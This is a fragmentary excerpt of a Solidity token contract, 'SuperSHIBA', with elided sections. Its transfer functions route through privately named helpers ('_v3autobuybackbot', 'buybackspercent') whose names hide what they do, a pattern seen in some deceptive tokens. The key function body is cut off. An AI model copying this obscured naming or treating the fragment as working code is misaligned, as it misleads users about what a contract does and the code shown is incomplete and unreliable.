...
contract SuperSHIBA is IERC20, Ownable {
    ...
    function transferFrom(
        ...
        _v3autobuybackbot(sender, recipient, amount);
        return buybackspercent(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _v3autobuybackbot(msg.sender, recipient, amount);
        return true;
    }

    function _v3autobuybackbot (
        address from,
        address to,
        uint256 amount
    ) private {
